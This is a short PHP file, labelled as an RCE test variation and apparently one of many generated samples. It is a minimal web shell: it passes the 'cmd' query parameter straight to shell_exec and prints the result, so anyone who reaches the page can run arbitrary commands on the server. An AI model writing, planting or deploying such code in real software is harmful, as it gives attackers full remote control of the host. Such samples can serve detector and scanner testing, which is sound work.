<?php
// RCE test variation #1352
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>